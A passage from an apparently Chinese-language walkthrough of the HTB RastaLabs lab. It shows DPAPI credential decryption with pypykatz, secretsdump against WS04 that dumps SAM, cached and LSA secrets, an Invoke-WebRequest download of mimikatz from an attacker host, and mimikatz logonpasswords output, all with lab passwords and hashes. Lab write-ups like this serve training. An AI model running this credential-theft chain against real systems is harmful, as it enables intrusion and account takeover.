                domainname RLAB
                password None
                password (hex)
        == CREDMAN [453e2]==
                luid 283618
                username flag
                domain localhost
                password RASTA{wh3r3_w45_2f4_!?}
                password (hex)520041005300540041007b00770068003300720033005f007700340035005f003200660034005f0021003f007d000000
        == DPAPI [453e2]==
                luid 283618
                key_guid 37fe87d9-4d2d-4dc6-aa54-1a011f267940
                masterkey 40fc84e4d4f44f01c8d4fb8dccc8da37bbada94ecb374e813c46b03e0cd35fd4d285b5826a411fc6d3cf382d4f3aa6010ea3cae8a8a11fd4b375908e6ca17067
                sha1_masterkey fcfcfa4cf4f4a89ae9375bc6edd9a15b2c876cea
        == DPAPI [453e2]==
                luid 283618
                key_guid 3fc33032-36a7-481e-8bc5-c4dd39cfed29
                masterkey f719aee4693f3109521906ca3b44d1357f76f33188201075e99a895660d9e8ed337a49dd2ca1845adceaf3c8cf2c96f8e2fbf8a252a2291bbf17993eed041b01
                sha1_masterkey 0ac4f0369fd929661d8726cbd0daa13f347a3f9a
        == DPAPI [453e2]==
                luid 283618
                key_guid d4c2b28a-a6f3-415c-a593-67ffdcecc34c
                masterkey a282bfb3c4e0f44e04a7842060980f9bbb48dfbeffdf8c3154c1844755600977abbc5768552be042096d57da87fabe816594fe3456ce2cd8098d6e9808ee8185
                sha1_masterkey 687c0e30230080b8084b30479542666554bcf005
        == DPAPI [453e2]==
                luid 283618
                key_guid 1a5a490d-4cfb-4d77-bd86-4d36c308065e
                masterkey 15dce65eaa879ea00e8570b792a66bf0a7c06dcbb75f4d92362221a9d7fb6c13ed555d13aa0d38161c054bd17740cb4f803bd912bfe8a781f1d67cbbca1cbe7f
                sha1_masterkey efe7ccfe80f947249e455c62483eaf16cd66d579

```

### **<font style="color:rgb(6, 10, 38);">枚举 Credential 文件</font>**
```latex
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem "C:\Users\epugh\AppData\Local\Microsoft\Credentials\" -Force


    Directory: C:\Users\epugh\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-        10/21/2018   3:02 PM            436 936A68B5AC87C545C4A22D1AF264C8E9

```

### 下载<font style="color:rgb(6, 10, 38);">Credential 文件</font>
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> $bytes = [System.IO.File]::ReadAllBytes("C:\Users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9")
[System.Convert]::ToBase64String($bytes)

AQAAAKgBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAkqTGfeI2LUy+Zrop0mPdogAAACAwAAAATABvAGMAYQBsACAAQwByAGUAZABlAG4AdABpAGEAbAAgAEQAYQB0AGEADQAKAAAAA2YAAMAAAAAQAAAAA6D8op74QvIicJrHGPPglQAAAAAEgAAAoAAAABAAAACVD3N5cQToscoqBcYMwluq8AAAAH/40rWMdlDf0WCGaygtTfGQ0TBMAsgMsAwoV3KWm3VzYRkSedGgIijXoXTkXw/ZQhGKem/eTgUMeEDZKxJBKt4CFLzKy/MkS8YMHxTDeIOFhklkB3x9568P30jYbBfJyBbCW092QHZ4AN/7BluUyKflwmbsa0QNjJVWmCFs9wO3ay7qTWNeYmYRvQpuThrEMVbNvtXPWtglZ0UXqO4qaYS6dqKcHbxbRVwnnglDxm4R4iNbDsjlaRs4ou0/M4/IIKWPDK2pfmq/e0Lf0dZrUmnfffjlJGmRPHM96b3oqJfYkc520I8+qoGtF8UIIiNPwhQAAACVh4OXqAcFFTeWNyIG8mtrTod+Yg==
```

```plain
cd /home/kali/Desktop/htb/rastalabs/cred
echo "AQAAAKgBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAkqTGfeI2LUy+Zrop0mPdogAAACAwAAAATABvAGMAYQBsACAAQwByAGUAZABlAG4AdABpAGEAbAAgAEQAYQB0AGEADQAKAAAAA2YAAMAAAAAQAAAAA6D8op74QvIicJrHGPPglQAAAAAEgAAAoAAAABAAAACVD3N5cQToscoqBcYMwluq8AAAAH/40rWMdlDf0WCGaygtTfGQ0TBMAsgMsAwoV3KWm3VzYRkSedGgIijXoXTkXw/ZQhGKem/eTgUMeEDZKxJBKt4CFLzKy/MkS8YMHxTDeIOFhklkB3x9568P30jYbBfJyBbCW092QHZ4AN/7BluUyKflwmbsa0QNjJVWmCFs9wO3ay7qTWNeYmYRvQpuThrEMVbNvtXPWtglZ0UXqO4qaYS6dqKcHbxbRVwnnglDxm4R4iNbDsjlaRs4ou0/M4/IIKWPDK2pfmq/e0Lf0dZrUmnfffjlJGmRPHM96b3oqJfYkc520I8+qoGtF8UIIiNPwhQAAACVh4OXqAcFFTeWNyIG8mtrTod+Yg==" | base64 -d > 936A68B5AC87C545C4A22D1AF264C8E9
```

### 解密<font style="color:rgb(6, 10, 38);">Credential 文件</font>
#### SID-Nanodump
```plain
== LogonSession ==
authentication_id 283618 (453e2)
session_id 1
username epugh
domainname RLAB
logon_server DC01
logon_time 2026-03-16T03:26:27.561607+00:00
sid S-1-5-21-1396373213-2872852198-2033860859-1151
luid 283618
        == MSV ==
                Username: epugh
                Domain: RLAB
                LM: NA
                NT: 326457b72c3f136d80d99bdbb935d109
                SHA1: f7fc5ef4b5f4131e09f5d866f8db0a35b5604ee9
                DPAPI: 2ac19fc98ab4188d45c43fe99fe3be5c00000000
```

得到sid S-1-5-21-1396373213-2872852198-2033860859-1151

#### MKGUID-Pypykatz
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs/cred]
└─$ pypykatz dpapi describe credential 936A68B5AC87C545C4A22D1AF264C8E9
== CredentialFile ==
version: 1 
size: 424 
unk: 0 
data: b'\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb\x01\x00\x00\x00\x92\xa4\xc6}\xe26-L\xbef\xba)\xd2c\xdd\xa2\x00\x00\x00 0\x00\x00\x00L\x00o\x00c\x00a\x00l\x00 \x00C\x00r\x00e\x00d\x00e\x00n\x00t\x00i\x00a\x00l\x00 \x00D\x00a\x00t\x00a\x00\r\x00\n\x00\x00\x00\x03f\x00\x00\xc0\x00\x00\x00\x10\x00\x00\x00\x03\xa0\xfc\xa2\x9e\xf8B\xf2"p\x9a\xc7\x18\xf3\xe0\x95\x00\x00\x00\x00\x04\x80\x00\x00\xa0\x00\x00\x00\x10\x00\x00\x00\x95\x0fsyq\x04\xe8\xb1\xca*\x05\xc6\x0c\xc2[\xaa\xf0\x00\x00\x00\x7f\xf8\xd2\xb5\x8cvP\xdf\xd1`\x86k(-M\xf1\x90\xd10L\x02\xc8\x0c\xb0\x0c(Wr\x96\x9busa\x19\x12y\xd1\xa0"(\xd7\xa1t\xe4_\x0f\xd9B\x11\x8azo\xdeN\x05\x0cx@\xd9+\x12A*\xde\x02\x14\xbc\xca\xcb\xf3$K\xc6\x0c\x1f\x14\xc3x\x83\x85\x86Id\x07|}\xe7\xaf\x0f\xdfH\xd8l\x17\xc9\xc8\x16\xc2[Ov@vx\x00\xdf\xfb\x06[\x94\xc8\xa7\xe5\xc2f\xeckD\r\x8c\x95V\x98!l\xf7\x03\xb7k.\xeaMc^bf\x11\xbd\nnN\x1a\xc41V\xcd\xbe\xd5\xcfZ\xd8%gE\x17\xa8\xee*i\x84\xbav\xa2\x9c\x1d\xbc[E\\\'\x9e\tC\xc6n\x11\xe2#[\x0e\xc8\xe5i\x1b8\xa2\xed?3\x8f\xc8 \xa5\x8f\x0c\xad\xa9~j\xbf{B\xdf\xd1\xd6kRi\xdf}\xf8\xe5$i\x91<s=\xe9\xbd\xe8\xa8\x97\xd8\x91\xcev\xd0\x8f>\xaa\x81\xad\x17\xc5\x08"#O\xc2\x14\x00\x00\x00\x95\x87\x83\x97\xa8\x07\x05\x157\x967"\x06\xf2kkN\x87~b' 
blob: == DPAPI_BLOB ==
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: 7dc6a492-36e2-4c2d-be66-ba29d263dda2 
flags: 536870912 
description_length: 48 
description: b'L\x00o\x00c\x00a\x00l\x00 \x00C\x00r\x00e\x00d\x00e\x00n\x00t\x00i\x00a\x00l\x00 \x00D\x00a\x00t\x00a\x00\r\x00\n\x00\x00\x00' 
crypto_algorithm: 26115 
crypto_algorithm_length: 192 
salt_length: 16 
salt: b'\x03\xa0\xfc\xa2\x9e\xf8B\xf2"p\x9a\xc7\x18\xf3\xe0\x95' 
HMAC_key_length: 0 
HMAC_key: b'' 
hash_algorithm: 32772 
HMAC: b'\x95\x0fsyq\x04\xe8\xb1\xca*\x05\xc6\x0c\xc2[\xaa' 
data_length: 240 
data: b'\x7f\xf8\xd2\xb5\x8cvP\xdf\xd1`\x86k(-M\xf1\x90\xd10L\x02\xc8\x0c\xb0\x0c(Wr\x96\x9busa\x19\x12y\xd1\xa0"(\xd7\xa1t\xe4_\x0f\xd9B\x11\x8azo\xdeN\x05\x0cx@\xd9+\x12A*\xde\x02\x14\xbc\xca\xcb\xf3$K\xc6\x0c\x1f\x14\xc3x\x83\x85\x86Id\x07|}\xe7\xaf\x0f\xdfH\xd8l\x17\xc9\xc8\x16\xc2[Ov@vx\x00\xdf\xfb\x06[\x94\xc8\xa7\xe5\xc2f\xeckD\r\x8c\x95V\x98!l\xf7\x03\xb7k.\xeaMc^bf\x11\xbd\nnN\x1a\xc41V\xcd\xbe\xd5\xcfZ\xd8%gE\x17\xa8\xee*i\x84\xbav\xa2\x9c\x1d\xbc[E\\\'\x9e\tC\xc6n\x11\xe2#[\x0e\xc8\xe5i\x1b8\xa2\xed?3\x8f\xc8 \xa5\x8f\x0c\xad\xa9~j\xbf{B\xdf\xd1\xd6kRi\xdf}\xf8\xe5$i\x91<s=\xe9\xbd\xe8\xa8\x97\xd8\x91\xcev\xd0\x8f>\xaa\x81\xad\x17\xc5\x08"#O\xc2' 
signature_length: 20 
signature: b'\x95\x87\x83\x97\xa8\x07\x05\x157\x967"\x06\xf2kkN\x87~b' 
hash_algorithm_length: 160 
HMAC_length: 16 
to_sign: b'\x01\x00\x00\x00\x92\xa4\xc6}\xe26-L\xbef\xba)\xd2c\xdd\xa2\x00\x00\x00 0\x00\x00\x00L\x00o\x00c\x00a\x00l\x00 \x00C\x00r\x00e\x00d\x00e\x00n\x00t\x00i\x00a\x00l\x00 \x00D\x00a\x00t\x00a\x00\r\x00\n\x00\x00\x00\x03f\x00\x00\xc0\x00\x00\x00\x10\x00\x00\x00\x03\xa0\xfc\xa2\x9e\xf8B\xf2"p\x9a\xc7\x18\xf3\xe0\x95\x00\x00\x00\x00\x04\x80\x00\x00\xa0\x00\x00\x00\x10\x00\x00\x00\x95\x0fsyq\x04\xe8\xb1\xca*\x05\xc6\x0c\xc2[\xaa\xf0\x00\x00\x00\x7f\xf8\xd2\xb5\x8cvP\xdf\xd1`\x86k(-M\xf1\x90\xd10L\x02\xc8\x0c\xb0\x0c(Wr\x96\x9busa\x19\x12y\xd1\xa0"(\xd7\xa1t\xe4_\x0f\xd9B\x11\x8azo\xdeN\x05\x0cx@\xd9+\x12A*\xde\x02\x14\xbc\xca\xcb\xf3$K\xc6\x0c\x1f\x14\xc3x\x83\x85\x86Id\x07|}\xe7\xaf\x0f\xdfH\xd8l\x17\xc9\xc8\x16\xc2[Ov@vx\x00\xdf\xfb\x06[\x94\xc8\xa7\xe5\xc2f\xeckD\r\x8c\x95V\x98!l\xf7\x03\xb7k.\xeaMc^bf\x11\xbd\nnN\x1a\xc41V\xcd\xbe\xd5\xcfZ\xd8%gE\x17\xa8\xee*i\x84\xbav\xa2\x9c\x1d\xbc[E\\\'\x9e\tC\xc6n\x11\xe2#[\x0e\xc8\xe5i\x1b8\xa2\xed?3\x8f\xc8 \xa5\x8f\x0c\xad\xa9~j\xbf{B\xdf\xd1\xd6kRi\xdf}\xf8\xe5$i\x91<s=\xe9\xbd\xe8\xa8\x97\xd8\x91\xcev\xd0\x8f>\xaa\x81\xad\x17\xc5\x08"#O\xc2' 
```

得到masterkey_guid: 7dc6a492-36e2-4c2d-be66-ba29d263dda2 

```powershell
# 在 Evil-WinRM 或 PowerShell 中执行
$SID = "S-1-5-21-1396373213-2872852198-2033860859-1151"
$MKGUID = "7dc6a492-36e2-4c2d-be66-ba29d263dda2"
$MKPath = "C:\Users\epugh\AppData\Roaming\Microsoft\Protect\$SID\$MKGUID"

# 读取并输出 Base64
$bytes = [System.IO.File]::ReadAllBytes($MKPath)
[System.Convert]::ToBase64String($bytes)
```

```plain
AgAAAAAAAAAAAAAANwBkAGMANgBhADQAOQAyAC0AMwA2AGUAMgAtADQAYwAyAGQALQBiAGUANgA2AC0AYgBhADIAOQBkADIANgAzAGQAZABhADIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAhW3DAyDkc8jY3j9cxNMrllBGAAAJgAAAA2YAAICsXqW+T4jsC6MKY/RCICiQn6il631nM2s0f/4k3mc0tbauBl94xRjOD+exCk8RPIcH7BLGuSfRIsrlYrEbB4f5SdYVY/H1RjvmgRwb7TLmtbQ2tGCq6RHwegyW9YoJ9abYP+vGd5vNAgAAALHFbaxaFjemuq8sq89ZGVRQRgAACYAAAANmAACNKMaLGML4Ur4tOBrA6VeWZtxULmD8+txqg4ASegsJOA6qabwHtJrkisnzZgigxz5EM395mVbP1cU3R2Gs3/U1QRPTxj98O7sCAAAAAAEAAFgAAADBupybnSWuQ6c9pGkRE+SVUtzZj3JAPTqabMlzw/wnrc5xbsbujrFO1x7zBiIFNKr4KsHkSsYWTxFRoT7iRiZzy/4AhLZHYPCTNrmDqQ0RdUyhEoUX3txq0d2ZPWsrOysCwHnyViB5FIwIdgfecv1SGC4O711x6r8wdLD2fQp/Zfja2dAlDiNJHXjI5dJWVGGjoyW8Dg1eJQZtHQ2JRIFOdu+EWTGkfqH9SldhTZtM6LcKUcGOkeaJvPmShPvNeEUJ4ZRV9XL8kIL4t7QjmzULCd1MAmpM8zZiVRMDtsT6tQlv0qHAzIleNewCHG6uBEwgstX6RiFW+5vmKk5+K+S/070UldaID5yGJvLwaQAijAKaclawu/4RBL+S4GtEOdMAsyjcMbf4fsL6GUHZuYt0aVIhTDXaodex8JlZeqSYgoimvRAh+HHPbDpSmHeGfLhpbypD3myD1v4dPE/jozpNexTXxHSBahk=
```

**将输出的 Base64 字符串复制下来**

---

#### 在 Kali 上保存 MasterKey 文件
```bash
cd /home/kali/Desktop/htb/rastalabs/cred

# 创建目录
mkdir -p masterkeys

# 将 Base64 解码保存（替换 YOUR_BASE64 为实际内容）
echo "YOUR_BASE64_STRING_HERE" | base64 -d > masterkeys/7dc6a492-36e2-4c2d-be66-ba29d263dda2

# 验证文件
ls -la masterkeys/
file masterkeys/7dc6a492-36e2-4c2d-be66-ba29d263dda2
```

---

#### 用密码 + SID 生成 PreKey
```bash
cd /home/kali/Desktop/htb/rastalabs/cred

# 用户 SID
SID="S-1-5-21-1396373213-2872852198-2033860859-1151"

# 密码
PASSWORD="Sarah2017"

# 生成 prekey
pypykatz dpapi prekey password "$SID" "$PASSWORD" -o prekey.txt
pypykatz dpapi prekey password "S-1-5-21-1396373213-2872852198-2033860859-1151" "Sarah2017" -o prekey.txt


# 查看生成的 prekey
cat prekey.txt
```

---

#### 用 PreKey 解密 MasterKey 文件
```bash
cd /home/kali/Desktop/htb/rastalabs/cred

# 解密 masterkey 文件
pypykatz dpapi masterkey masterkeys/7dc6a492-36e2-4c2d-be66-ba29d263dda2 prekey.txt -o mk_decrypted.json

# 查看解密结果
cat mk_decrypted.json
```

**输出应该包含解密后的 MasterKey（64 字节 hex）**

```bash
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs/cred]
└─$ cat mk_decrypted.json
{
    "backupkeys": {},
    "masterkeys": {
        "7dc6a492-36e2-4c2d-be66-ba29d263dda2": "dcd70638e50e3bcec7cd7fb888399748fea41f9bb137a72a13c98e30ee64469e27a03083256e51f04051a427da9b8c34520fad6c8a486c3f6043ea959026670c"
    }
}      
```

---

#### 用解密后的 MasterKey 解密 Credential
```bash
cd /home/kali/Desktop/htb/rastalabs/cred

# 用解密后的 masterkey 解密 credential
pypykatz dpapi credential mk_decrypted.json 936A68B5AC87C545C4A22D1AF264C8E9
```

```bash
type : DOMAIN_PASSWORD (2)
last_written : 131846041687315775
target : Domain:target=TERMSRV/sql01.rastalabs.local
username : RLAB\epugh_adm
unknown4 : IReallyH8LongPasswords!
```

得到凭据epugh_adm\IReallyH8LongPasswords!

## WS04-secretsdump
```bash
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs/cred]
└─$ proxychains -q secretsdump.py "Administrator:uB2cNny6@10.10.123.101"
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xda1116943ff0df8fb16da4bfa6f0e0d7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d6f0a251197ae8f0dac31ec9a01a59e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9c646760d49ea04bd4d8bc2bc57e16b7:::
[*] Dumping cached domain logon information (domain/username:hash)
RASTALABS.LOCAL/bowen:$DCC2$10240#bowen#f475f7a4aef2ea94a82b239b65f998ae
RASTALABS.LOCAL/ngodfrey:$DCC2$10240#ngodfrey#7311d73b2207f6187fbc55dd9db4faf4
RASTALABS.LOCAL/Administrator:$DCC2$10240#Administrator#4846fb364be3573b565cdf0b9d1798af
RASTALABS.LOCAL/epugh_adm:$DCC2$10240#epugh_adm#5aa1c318bf1ce892b35d9e020277431d
RASTALABS.LOCAL/ngodfrey_adm:$DCC2$10240#ngodfrey_adm#6cf7119ebe6b52aa642bf60afee4cf85
RASTALABS.LOCAL/acronis_backup:$DCC2$10240#acronis_backup#877a2a9069c06f7992c3cfcf0863e51c
RASTALABS.LOCAL/rweston_da:$DCC2$10240#rweston_da#24c8e9ab0617120753dc6d5ea9262ea6
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RLAB\WS04$:aes256-cts-hmac-sha1-96:4b04dcef77a6882b56c733bf6d8788a51eea3cf45485b7a061fce75957307e0c
RLAB\WS04$:aes128-cts-hmac-sha1-96:01bb0dd932c773d78c75b3a6f982df87
RLAB\WS04$:des-cbc-md5:5b68549b57462c85
RLAB\WS04$:plain_password_hex:8d0a136a9b5419795a3080f723e5fa6b1311b8d81b6e2b5684fc396a9391b9b863d2bc6bf7cffb8db1e366c719f7f59153f03b21a4b6c1ae5df383279e7aa9ef1c7eeec8c3f5a41a553f31f49e2ae6de8c1ecfc9794ea52f7fe60293b8653b02f5d33265b3e961d714f69a5b71e4498923e2a2f65b58f3a5afa4ce35c767acf316380c2b4b2952681560201024e5f82fe1b8c4fc576a1c7b59de6d210decd0db104e2240e907990f7ca239785ca4bc3f06f2c8a920c13cb256a967a162f5695339129936b964669819f8664863b68a13b9b0c89d3ad39260fb42e5964c911b127527015893ad2052fe87d9d8c9acfa22
RLAB\WS04$:aad3b435b51404eeaad3b435b51404ee:69a5dd0c98b0f2c0ebfc642cbabb89f0:::
[*] DefaultPassword 
rastalabs.local\bowen:NovakDjokovic001
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5540830fcf7ff94a8a8baf299c7f03bb1e0e25fa
dpapi_userkey:0x871434c06e554e729f0d18f2587475dc9d8a92e6
[*] NL$KM 
 0000   70 41 2D E9 BA 16 09 A9  C0 3E 37 81 C8 70 7F E0   pA-......>7..p..
 0010   E5 69 D7 53 A6 63 7D B3  EB C1 5A E1 DA 9C 2B 4C   .i.S.c}...Z...+L
 0020   99 12 8B 91 0F 05 F1 21  DD 2D A1 34 F9 CA 31 91   .......!.-.4..1.
 0030   01 48 72 38 BF 5A BF EC  45 92 6F D8 AA C9 4C 5B   .Hr8.Z..E.o...L[
NL$KM:70412de9ba1609a9c03e3781c8707fe0e569d753a6637db3ebc15ae1da9c2b4c99128b910f05f121dd2da134f9ca319101487238bf5abfec45926fd8aac94c5b
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

得到bowen密码NovakDjokovic001

## WS04-mimikatz
### upload
```bash
Invoke-WebRequest -Uri http://10.10.16.2:443/mimikatz.exe -OutFile C:\Users\Public\mimikatz.exe
```

### sekurlsa::logonpasswords
```bash
*Evil-WinRM* PS C:\Users\Public> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 289962 (00000000:00046caa)
Session           : Interactive from 1
User Name         : bowen
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 03:26:27
SID               : S-1-5-21-1396373213-2872852198-2033860859-1152
        msv :
         [00000003] Primary
         * Username : bowen
         * Domain   : RLAB
         * NTLM     : 2acfc0ad1622bfbaf46324a32d0d650c
         * SHA1     : 75488d837a7fd007d589d9c4c7a41051cad3bb4c
         * DPAPI    : ec5cf905c9bebad318cd68a7a409a963
        tspkg :
        wdigest :
         * Username : bowen
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : bowen
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : bowen
         * Domain   : bowen
         * Password : NovakDjokovic001
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:15
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 77576 (00000000:00012f08)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS04$
         * Domain   : rastalabs.local
         * Password : 8d 0a 13 6a 9b 54 19 79 5a 30 80 f7 23 e5 fa 6b 13 11 b8 d8 1b 6e 2b 56 84 fc 39 6a 93 91 b9 b8 63 d2 bc 6b f7 cf fb 8d b1 e3 66 c7 19 f7 f5 91 53 f0 3b 21 a4 b6 c1 ae 5d f3 83 27 9e 7a a9 ef 1c 7e ee c8 c3 f5 a4 1a 55 3f 31 f4 9e 2a e6 de 8c 1e cf c9 79 4e a5 2f 7f e6 02 93 b8 65 3b 02 f5 d3 32 65 b3 e9 61 d7 14 f6 9a 5b 71 e4 49 89 23 e2 a2 f6 5b 58 f3 a5 af a4 ce 35 c7 67 ac f3 16 38 0c 2b 4b 29 52 68 15 60 20 10 24 e5 f8 2f e1 b8 c4 fc 57 6a 1c 7b 59 de 6d 21 0d ec d0 db 10 4e 22 40 e9 07 99 0f 7c a2 39 78 5c a4 bc 3f 06 f2 c8 a9 20 c1 3c b2 56 a9 67 a1 62 f5 69 53 39 12 99 36 b9 64 66 98 19 f8 66 48 63 b6 8a 13 b9 b0 c8 9d 3a d3 92 60 fb 42 e5 96 4c 91 1b 12 75 27 01 58 93 ad 20 52 fe 87 d9 d8 c9 ac fa 22
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 77558 (00000000:00012ef6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS04$
         * Domain   : rastalabs.local
         * Password : 8d 0a 13 6a 9b 54 19 79 5a 30 80 f7 23 e5 fa 6b 13 11 b8 d8 1b 6e 2b 56 84 fc 39 6a 93 91 b9 b8 63 d2 bc 6b f7 cf fb 8d b1 e3 66 c7 19 f7 f5 91 53 f0 3b 21 a4 b6 c1 ae 5d f3 83 27 9e 7a a9 ef 1c 7e ee c8 c3 f5 a4 1a 55 3f 31 f4 9e 2a e6 de 8c 1e cf c9 79 4e a5 2f 7f e6 02 93 b8 65 3b 02 f5 d3 32 65 b3 e9 61 d7 14 f6 9a 5b 71 e4 49 89 23 e2 a2 f6 5b 58 f3 a5 af a4 ce 35 c7 67 ac f3 16 38 0c 2b 4b 29 52 68 15 60 20 10 24 e5 f8 2f e1 b8 c4 fc 57 6a 1c 7b 59 de 6d 21 0d ec d0 db 10 4e 22 40 e9 07 99 0f 7c a2 39 78 5c a4 bc 3f 06 f2 c8 a9 20 c1 3c b2 56 a9 67 a1 62 f5 69 53 39 12 99 36 b9 64 66 98 19 f8 66 48 63 b6 8a 13 b9 b0 c8 9d 3a d3 92 60 fb 42 e5 96 4c 91 1b 12 75 27 01 58 93 ad 20 52 fe 87 d9 d8 c9 ac fa 22
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:13
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : ws04$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46544 (00000000:0000b5d0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS04$
         * Domain   : rastalabs.local
         * Password : 8d 0a 13 6a 9b 54 19 79 5a 30 80 f7 23 e5 fa 6b 13 11 b8 d8 1b 6e 2b 56 84 fc 39 6a 93 91 b9 b8 63 d2 bc 6b f7 cf fb 8d b1 e3 66 c7 19 f7 f5 91 53 f0 3b 21 a4 b6 c1 ae 5d f3 83 27 9e 7a a9 ef 1c 7e ee c8 c3 f5 a4 1a 55 3f 31 f4 9e 2a e6 de 8c 1e cf c9 79 4e a5 2f 7f e6 02 93 b8 65 3b 02 f5 d3 32 65 b3 e9 61 d7 14 f6 9a 5b 71 e4 49 89 23 e2 a2 f6 5b 58 f3 a5 af a4 ce 35 c7 67 ac f3 16 38 0c 2b 4b 29 52 68 15 60 20 10 24 e5 f8 2f e1 b8 c4 fc 57 6a 1c 7b 59 de 6d 21 0d ec d0 db 10 4e 22 40 e9 07 99 0f 7c a2 39 78 5c a4 bc 3f 06 f2 c8 a9 20 c1 3c b2 56 a9 67 a1 62 f5 69 53 39 12 99 36 b9 64 66 98 19 f8 66 48 63 b6 8a 13 b9 b0 c8 9d 3a d3 92 60 fb 42 e5 96 4c 91 1b 12 75 27 01 58 93 ad 20 52 fe 87 d9 d8 c9 ac fa 22
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46520 (00000000:0000b5b8)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS04$
         * Domain   : rastalabs.local
